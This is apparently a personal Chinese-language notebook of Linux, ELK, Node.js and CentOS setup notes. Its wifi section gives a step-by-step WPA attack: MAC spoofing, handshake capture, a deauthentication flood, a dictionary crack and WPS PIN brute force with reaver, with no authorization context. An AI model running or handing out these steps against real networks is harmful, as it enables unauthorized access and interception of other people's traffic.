	+ 日志分析场景是：直接在日志文件中 grep、awk 就可以获得自己想要的信息。但在规模较大的场景中，此方法效率低下，面临问题包括日志量太大如何归档、文本搜索太慢怎么办、如何多维度查询。需要集中化的日志管理，所有服务器上的日志收集汇总。常见解决思路是建立集中式日志收集系统，将所有节点上的日志统一收集，管理，访问。
	+ 一般大型系统是一个分布式部署的架构，不同的服务模块部署在不同的服务器上，问题出现时，大部分情况需要根据问题暴露的关键信息，定位到具体的服务器和服务模块，构建一套集中式日志系统，可以提高定位问题的效率。
- 特点：
	1）收集－能够采集多种来源的日志数据
	2）传输－能够稳定的把日志数据传输到中央系统
	3）存储－如何存储日志数据
	4）分析－可以支持 UI 分析
	5）警告－能够提供错误报告，监控机制
- 地址：
	+ 展示地址：localhost:5601
	+ 接受数据地址：http://localhost:9200/elk1/test1
- idea：
	+ 直接利用ELK的处理大数据的特点，对各大比特币、以太坊等币进行交易信息、区块信息、价格汇总的整体信息的汇总分析、可视化、大数据搜索。——可能就是类似交易所了！

## Ubuntu提速
0. 查看分析：
	- sudo systemd-analyze plot > boot.svg
	- 看图分析问题
	- sudo systemctl disable apt-daily.service- 但我不能推荐这个，因为它需要注意，你的包信息保持最新，并被告知更新。
1. 多核启动：
	- Ubuntu默认是以单核启动的：
	- sudo vim /etc/init.d/rc
	- 把CONCURRENCY=makefile, 原来为none
	- 
2. 关闭服务
	- sudo apt install sysv-rc-conf
	- 启动：sudo sysv-rc-conf
	- 貌似不好用，则大招：
	- sudo update-rc.d -f mysql remove
	查看当前系统的运行级别(default:5)
	runlevel    // who -r 命令亦可
	相关文件夹
	/usr/lib/insserv/insserv 用来执行系统启动时脚本的应用程序
	/etc/init.d/*  放系统启动时运行的脚本
	/etc/init/*  放系统启动时相关服务的配置文件
3. 设置启动挂载盘：
	-  sudo vim /etc/fstab

4. 电源管理:
	- sudo apt install tlp
	- tlp配置: /etc/default/tlp 默认不需要修改
	- 启动tlp:
		- sudo tlp start
		- sudo tlp-stat
5. 任务管理器：兼容性不好~
	- Conky:https://webcache.googleusercontent.com/search?q=cache:X_X6Sigvv4UJ:https://askubuntu.com/questions/321018/setting-up-conky-on-ubuntu+&cd=13&hl=en&ct=clnk&gl=hk
	- sudo apt install conky conky-all
	- cd && wget -O .start-conky http://goo.gl/6RrEw
	- chmod +x .start-conky
	- 打开startup applications preferences:
		- 也就是gnome-session-properties
		- /home/yuziqi/.start-conky
	- Conky-Manager:
		- sudo apt-add-repository ppa:teejee2008/ppa
		- sudo apt update
		- sudo apt install conky-manager
	- 自启动在conky-manager的setting选项里

6. 视频管理：
	- WinFF
7. TechPill
8. WMail
9. htop
	- sudo pacman -S htop
10. weather report


## kali-linux:
- Ubuntu安装kali：Katoolin
	- sudo apt-get install git
	- sudo git clone https://github.com/LionSec/katoolin.git
	- 将katoolin目录下的python脚本复制到/usr/bin/目录下：sudo cp katoolin/katoolin.py /usr/bin/katoolin
	- sudo chmod ugo+x /usr/bin/katoolin
	- 启动：sudo katoolin
	- 安装工具包：
		- 输入back返回上一级, 输入gohome返回主菜单; 按Ctrl+C退出katoolin。
		- 安装所有：1 2 back 2 0
		- 安装局部：1 2 back 2 3 1：选择安装aircrack-ng无线网密码破解工具：
		- 安装kali程序菜单：
			- 1 2 back 3
			- 1 2 back 4
			- dash中搜索：indicator


## wifi破解:
- 准备:
	- service network-manager stop
	- 杀掉进程: sudo airmon-ng check kill
	- 如果要恢复wifi使用, 
		- 需要: airmon-ng stop wlan0
		- 然后: sudo service network-manager start
- 1.查看无线网卡: airmon-ng ; ifconfig 
- 隐藏自己, 修改mac:
	- 先停止无线接口:
		- airmon-ng stop wlp3s0
		- 或者: ifconfig wlp3s0 down
	- macchanger --mac 00:11:22:33:44:55 wlp3s0
	- 重启无线接口:
		- airmon-ng start wlp3s0
- 若启动失败:
	- rfkill list
	- 解锁全部: rfkill unblock all
- 2.搜索无线:
	- start后发现monitor mode在mon9:
		- sudo airodump-ng mon9
		- 显示很慢..
	- 关闭nm管理:
		- sudo service network-manager stop # 停止nm服务
		- 或者: sudo /etc/init.d/network-manager stop
		- 取消开机启动: chkconfig network-manager off
	- 关闭wpa_supplicant:(不需要)
		- wpa_supplicant用来对数据流进行加密, 在网卡up的时候启动;
- 3.抓取握手包：
	- sudo airodump-ng -c 6 --bssid C8:3A:35:30:C8:12 -w ~/yuyu mon9
	- -c表示channel，-w表示保存的路径和前缀名	
- 4.强行设备重连：
	- 新建一个终端
	- aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:45:00:CC mon9
	- -0表示发起deauthentication泛洪攻击，2表示断开次数，-a是BSSID，-c是设备
	- 若成功，则上一步会捕捉到握手包，显示WPA handshake:
	- 断开监控：airmon-ng stop mon9
- 5.破解：
	- aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rock.txt ~/yuyu01.cap
	- yuyu01.cap就是上一步捕捉到的握手包yuyu01.cap
	- 后记可以使用GPU加速破解
- WPS破解pin:
	- pin码:
		- 8位纯数字组成的识别码:
			- 1234 + 567 + 0
			- 第一部分和第二部分没关联
			- 最后的0是对第二部分的校验码
		- 破解:	
			- 先对单独的第一部分pin匹配, 一共0000-9999
			- 然后确定第二部分, 一共000-999
			- 最后一位自动得出
			- 一共11000种情况
	- 扫描路由器是否开启WPS功能:
		- wash -i wlan0
		- WPS Locked为no的都可以破解
	- 使用reaver破解:
		- reaver -i mon0 -b mac -S -vv
		- -b目标mac地址, -S最小的DH key, -vv显示警告
		- reaver默认从0000开始, 加上-p 9000就是从9000开始
		- pin过快会pin死路由器, 加上-d5 -t5延迟5秒
- 升级hacker:
	- 获取wifi密码后, 可以进一步使用kali下的中间人攻击, 从而进行流量分析
- 总结:
	- wifi密码不要和路由器的管理密码一样
	- 关闭路由器的WPS功能
	- 使用路由器的白名单功能
	- 不要连接公共wifi

 
## nodejs
- web请求过程：
	+ 输入URL：www.google.com
	+ DNS域名解析：域名与IP的映射
	+ 建立TCP连接：TCP三次握手
	+ 发送HTTP Request：请求信息
	+ Web浏览器：Nginx反向代理
	+ 应用服务器：Servlet处理请求
	+ 关闭TCP连接：请求响应完成
	+ 用户浏览器：渲染响应页面
- 正向、反向代理
	+ 正向Proxy：局域网 去访问 外部服务器
	+ 反向Reverse Proxy：客户端 去访问 局域网服务器
		* 封装网站服务器；
0. mogodb:
	- sudo apt install mongo
	- 测试: sudo -E mongo
		- show ; show dbs ; use test ;
		- db.post.insert({'Title':'testfirst', 'Name':'yu'})
		- db.post.findOne()
	- cmd:
		- db.nodedb.find()
		- show collections
		- 创建hello集合: 并插入一条记录:db.hello.insert({"name":"testdb"})
		- 删除当前数据库: db.dropDatabase()
		- collection级操作:
			- db.createCollection("hello")
			- db.hello.insert({"name": "123"})
			- db.hello.drop()
			- db.renameCollection("HELLO")
			- db.HELLO.getIndexes()
			- db.HELLO.update({}, {$set:{"ex": "barrymore"}}, false, true)
				- 查询条件; 对象; 不存在该记录,就不插入对象?; 只更新找到的第一条记录?

1. node
	- 概念：
		+ apache就是静态网页服务器，就是将本地页面文件做一个网络映射，可以添加mod来扩展功能；
			* apache+PHP
		+ tomcat：java servlet容器，就是基于java的CGI动态页面服务器，静态页面只是一个附属功能
			* tomcat+java
		+ nginx：也是静态网页服务器，不过更多用于代理服务器
			* nodejs+nginx：每个服务器启动nodejs作为集群的节点，然后前面做一层负载均衡，反向代理到集群的服务器上。
		+ node.js:同一是一个容器，就是基于JS的CGI动态页面服务器；
		+ 都可以作为web服务器，只不过nodejs更倾向于业务逻辑。
	- 安装：
		+ sudo apt install nodejs
		+ sudo apt install nodejs-legacy
		+ sudo apt install npm
		+ 此时只能sudo npm -v可以看到
		+ npm -v 看不到，需要重新新开一个终端，刷新profile即可。
		+ (如果不是上面说的问题，执行官方的脚本curl ... | sh 应该没问题)
	- 测试：
		+ node -v  # nodejs的版本
		+ npm -v  # nodejs的包管理器npm的版本
	- 更改权限：
		+ 找到npm目录：npm config get prefix  # 一般都是/usr/local
		+ 将npm目录改为自己的当前用户所有者：sudo chown -R $(whoami) $(npm config get prefix)/{lib/node_modules,bin,share}
		+ 这样使用-g就不需要sudo了
	- node包管理器：
		+ nvm是更加上层的封装，免除权限问题，支持node多版本切换，有需要可以尝试。
	- node更新:		
		* npm cache clean -f
		* npm install -g n
		* sudo npm install npm@latest -g  # 更新npm到最新版本 ~~~~ 可用，但貌似有时候会不管用
		* n stable  # 这样一句就可以node更新到最新版本了。 ！！！！！！！！！最管用
		* sudo n ls # 查看所有版本信息
		* sudo n 8.9.4 # 切换到8.9.4版本
		* n --version
		* npm install -g npm
		* node -v; n ls; 
		* npm update -g packageName
		* node-gyp
			* 是用于编译Node.js的本机插件模块的Node.js中编写的跨平台命令行工具。
		设置python版本: npm config  set python /usr/bin/python2.7
		支持普通用户: sudo npm install --unsafe-perm -g node-inspector
		Debian的pakcage: sudo -E apt install libxkbfile-dev
		truffle-init-webpack@0.0.1 no repository field
			* sudo -E npm -g install webpack@2.1.0-beta.27 --save-dev
	
	- 版本更新问题: 
		rm -rf node_modules // force remove node_modules directory
		npm install
	- 不同版本的node安装同样的包：
		+ 提示哪个包需要rebuild，就rm -rvf node_modules/xxx/node_modules ; npm install

2. 包管理工具: npm
	- 临时修改npm源：
		+ npm --registry https://registry.npm.taobao.org install XXX.package
	- 永久修改npm源：
		+ 淘宝：npm config set registry http://registry.npm.taobao.org/
		+ 官方：npm config set registry https://registry.npmjs.org/
		+ 验证修改：npm config get registry 
	- 通过cnpm：
		+ npm install -g cnpm --registry=https://registry.npm.taobao.org
3. express框架:
	- express: nodejs的MVC开发框架
		- npm install -g express
	- express-generator: 命令工具
		- npm install -g express-generator
		- express --version
	- 库:
		- npm install mongoose
		- npm  install multer

4. 创建工程:
	- express -e test //
	- 目录:
		- bin: 启动文件,默认npm start
		- public: 静态文件,放置js, css, img等
		- routes: 路由信息文件,控制地址路由
		- views: 视图文件,放置模板文件ejs或jade等, 相当于html
		- 
	- 启动:
		- npm install ; 自动检测package.json文件,安装相应模块
		- npm start
		- 默认端口是3000, 可以在bin下的www文件查看

5. 基础:
	- require: 
		- require/exports/module三个预先定义好的变量可供使用
		- require函数, 传入模块
			- 相对路径 ./
			- 绝对路径 / 
		- exports对象, 是当前模块的导出对象
		- module对象, 访问当前模块的一些信息,主要是替换当前模块的导出对象

6. express and webpack
	- Express本质是一系列middleware的集合，因此，适合Express的webpack开发工具是webpack-dev-middleware和webpack-hot-middleware。
	-     // "dev": "webpack-dev-server"

## 未完待续

应用程序有两种模式C/S、B/S。
C/S是客户端/服务器端程序，也就是说这类程序一般独立运行。
B/S就是浏览器端/服务器端应用程序，一般借助IE等浏览器来运行。

服务器端是远程服务器，运行结果是由服务器产生的；
	所有的动态网页都是在服务器端执行的，例如ASP、PHP、JSP；
客户端就是网友的电脑。
	所有的静态网页都是在客户端执行的，例如JavaScript、Flash都是属于静态网页。 



## centos使用
- 说明：
	+ apt是Ubuntu、debian的包管理器
	+ yum属于Redhat、Centos包管理器
	+ centos、rhel、fedora应该使用rpm包格式。
	+ deb是Ubuntu、Debian的包。
0. 修改源
	- mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup
	- cd /etc/yum.repos.d/
	- wget http://mirrors.163.com/.help/CentOS7-Base-163.repo # 这是centos7
	- 生成缓存：yum makecache
	- 更新系统：yum -y update
	- 
1. 安装dpkg 暂时失效！！！
sudo yum -y install epel-release
sudo yum repolist
sudo yum install dpkg-devel dpkg-dev
2. 安装rpm包
	- rpm -ivh soft.rpm
	- yum install soft.rpm
3. yum安装
	- yum -y soft  # -y表示yes
	- yum update   # 更新yum
	- yum修改源：
		+ 下载对应版本的源文件：http://mirrors.163.com/.help/centos.html
		+ 先备份：mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup
		+ 然后拷贝覆盖进来。
		+ yum clean all
		+ yum makecache
4. 安装teamviewer13：
	- yum install -y team...13.rpm
	- 报错，缺少lib.so.6:yum install -y lib.so.6 
		+ 原因：teamviewer13至少centos7版本
	- teamviewer12在历史版本界面下载。
	- teamviewer:运行




1. 小米网】【实习】研发实习生招聘 :http://www.newsmth.net/nForum/#!article/Intern/249203
2. 算法工程师☆机器学习 :http://www.newsmth.net/nForum/#!article/Intern/249200
3. 奇虎360】测试实习生 :http://www.newsmth.net/nForum/#!article/Intern/246985
4. 中国信通院】规划所招募实习生:http://www.newsmth.net/nForum/#!article/Intern/249190
5. Kika北京】Kika Tech招聘人工智能数据分析实习生:http://www.newsmth.net/nForum/#!article/Intern/249187
6. 东北证券固收总部-量化研究员: http://www.newsmth.net/nForum/#!article/Intern/249186
7. 凤凰网】数据分析师: http://www.newsmth.net/nForum/#!article/Intern/249183
8. 妙计旅行】Python开发 实习优秀可转正: http://www.newsmth.net/nForum/#!article/Intern/249179
9. 【汽车之家】商业广告审核运营实习生: http://www.newsmth.net/nForum/#!article/Intern/249177
10.【汽车之家】新媒体运营实习岗: http://www.newsmth.net/nForum/#!article/Intern/249176
11. 华兴资本招聘HR实习生】:http://www.newsmth.net/nForum/#!article/Intern/249173
12. 理光中国研究院】自然语言处理实习生: http://www.newsmth.net/nForum/#!article/Intern/249006
13. 理光中国研究院】数据挖掘实习生: http://www.newsmth.net/nForum/#!article/Intern/249005
14. 【理光中国研究院】计算机视觉实习生: http://www.newsmth.net/nForum/#!article/Intern/249007
15. 360智能搜索实验室】暑期实习和应届校招研究培训项目: http://www.newsmth.net/nForum/#!article/Intern/249167
16. 海航科技集团数字化转型中心招聘机器学习实习生: http://www.newsmth.net/nForum/#!article/Intern/249147
17. 消消乐系列游戏暑期实习生补招计划 - http://www.newsmth.net/nForum/#!article/Intern/246944数据分析实习生: http://www.newsmth.net/nForum/#!article/Intern/248050
18. 医学图像算法实习生: http://www.newsmth.net/nForum/#!article/Intern/246944
